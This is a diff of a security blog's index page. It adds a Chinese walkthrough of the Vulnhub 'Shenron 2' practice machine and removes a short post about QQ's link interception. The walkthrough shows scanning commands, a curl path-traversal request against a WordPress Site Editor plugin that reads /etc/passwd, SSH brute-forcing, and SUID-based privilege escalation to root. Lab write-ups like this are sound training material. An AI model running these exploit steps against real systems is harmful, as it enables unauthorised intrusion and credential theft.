@@ -86,6 +86,94 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/24/Shenron-2/">
+                Shenron 2
+            </a>
+        </h2>
+    
+    <time>
+        Aug 24, 2022
+    </time>
+    <section class="content">
+        <h1><span id="shenron2">Shenron:2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称shenron2">名称：shenron:2</span></h4><h4><span id="发布日期202145">发布日期：2021.4.5</span></h4><h4><span id="作者shubham-mandloi">作者：Shubham mandloi</span></h4><h4><span id="系列shenron">系列：shenron</span></h4><h4><span id="推特shubhammandloi">推特：@shubhammandloi</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名shenron-2ova">文件名：shenron-2.ova</span></h4><h4><span id="文件大小37gb">文件大小：3.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshenronshenron-2ova">下载地址：</span></h4><h4><span id="md5-2883845ff2e1e122e1b1e75cf9a4b4e1">MD5: 2883845FF2E1E122E1B1E75CF9A4B4E1</span></h4><h4><span id="sha1-e66bda7ab264d1fea2103801bb422731f34f0599">SHA1: E66BDA7AB264D1FEA2103801BB422731F34F0599</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机shenron2和攻击机kali2021在VirtualBox下设置为桥接模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/24/Shenron-2/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.3.134：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.3.134/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放22，80及8080端口，访问主页查看源码，没有太多线索：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.3.136 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/4.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-2/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，没有发现太多值得关注的目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.3.136/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="wordpress漏洞利用">Wordpress漏洞利用</span></h3><blockquote>
+<p>1.先把解析写入host，然后访问192.168.3.136:8080，发现是wordpress搭建的页面，可以用wpscan尝试寻找下漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/7.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-2/8.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://shenron:8080 --api-token $(cat /opt/wpscan-api) --enumerate</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/9.png" alt="image-"></p>
+<p>2.发现有Site Editor的漏洞，我们可以看一下如何利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Site Editor 1.1.1</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://shenron:8080/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd，得到有两个用户和密码hash</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="ssh密码爆破初步提权">SSH密码爆破，初步提权</span></h3><blockquote>
+<p>1.用hydra进行jenny爆破，得到密码登录SSH：</p>
+<p><img src="/2022/08/24/Shenron-2/12.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-2/13.png" alt="image-"></p>
+<p>2.在jenny用户下，查看suid，可以发现&#x2F;usr&#x2F;bin&#x2F;Execute，查看文件（需要导入本地查看，不然是elf乱码）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/14.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shenron-2/15.png" alt="image-"></p>
+<p>3.我们可以知道这个文件的作用是将&#x2F;bin&#x2F;bash复制到&#x2F;mnt&#x2F;bash下，并给予shenron用户权限，那么我们可以利用这个文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Execute</span><br><span class="line">/mnt/bash -p</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shenron-2/16.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.查看.pass文件，我们能发现一串类似base编码的字符串，利用base32解密发现是shenron用户登录的密码：</p>
+<p><img src="/2022/08/24/Shenron-2/17.png" alt="image-"></p>
+<p>2.登录shenron后，查看权限，发现可以直接提权到root：</p>
+<p><img src="/2022/08/24/Shenron-2/18.png" alt="image-"></p>
+<p>3.在&#x2F;root目录下，可以找到flag，即root.txt：</p>
+<p><img src="/2022/08/24/Shenron-2/19.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Shenron/" rel="tag">Shenron</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/24/Shenron-1/">
                 Shenron 1
             </a>
@@ -2827,62 +2915,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/SRC/" rel="tag">SRC</a><a class="tag-none-link" href="/tags/Skadi/" rel="tag">Skadi</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/09/Request-Response-QQ/">
-                QQ 移动端访问控制策略小窥
-            </a>
-        </h2>
-    
-    <time>
-        Aug 9, 2022
-    </time>
-    <section class="content">
-        <h1><span id="qq-移动端访问控制策略小窥">QQ 移动端访问控制策略小窥</span></h1><h2><span id="起因">起因</span></h2><blockquote>
-<p>今天在学习 SRC 发掘的时候，看到很多介绍文章其实在 Hackone 上就有应用例，然后看到一篇需要权限访问的文章，遂要求登录。</p>
-<p>还没有个人账号，于是注册一下，到最后一步得到一个邮箱确认链接：</p>
-<p><img src="/2022/08/09/Request-Response-QQ/1.jpg" alt="image"></p>
-<p>由于是公司电脑，没有装额外通讯软件，遂在手机 click，果不其然被 QQ 拦截了<del>（这个做的真的不行）</del>：</p>
-<p><img src="/2022/08/09/Request-Response-QQ/2.jpg" alt="image"></p>
-<p>于是我把链接 copy 到 PC 上，重新访问，结果弹出该链接已经被使用了的页面，并且可以要求 Resend：</p>
-<p><img src="/2022/08/09/Request-Response-QQ/3.jpg" alt="image"></p>
-</blockquote>
-<h2><span id="推测">推测</span></h2><blockquote>
-<p>我顿了一下（柯南 BGM）：这个确认链接（token）已经被访问，只有可能是我刚才手机 click 了 button 导致的，也就是发送了请求（request），但是没有收到正确回应（response）。</p>
-<p>即 TX 是帮你请求过一次链接的<del>（说好听点是帮你，说不好听就是劫持&#x3D; &#x3D;）</del>，他拦截的只是响应包。</p>
-<ul>
-<li>这样会有两个问题：</li>
-</ul>
-<ol>
-<li>服务端是否是不分情况就去请求了这个链接的，如果换做是其他小公司的服务端这个策略应该是有问题的。</li>
-<li>你是按照什么来判断网站不合规的？证书？白名单？响应包内容？<br>如果是证书，很多 http 链接就会被误报；如果是白名单，那么不需要放行请求（request）就可以判断并拦截；如果是响应（response）内容，为什么 Hackone 还是拦了？</li>
-</ol>
-<p><img src="/2022/08/09/Request-Response-QQ/1.gif" alt="image"></p>
-</blockquote>
-<h2><span id="验证">验证</span></h2><blockquote>
-<p>在朋友（无中生友）的提醒下，发现可以用 dnslog 一试就能验证是否是进行了请求而拦截响应：</p>
-<p><img src="/2022/08/09/Request-Response-QQ/4.jpg" alt="image"></p>
-<p><img src="/2022/08/09/Request-Response-QQ/5.jpg" alt="image"></p>
-<p><del>其实我都不用打码，反正一个是 TX 的 ip，一个是电信的移动 ip</del></p>
-</blockquote>
-<h2><span id="结语">结语</span></h2><blockquote>
-<p>也就是小小发现而已，或许还火星了，记录一下<br>PS：微信现在还没有拦截限制好像，从那个上面倒是可以直接访问链接</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a>
             </div>
         
 
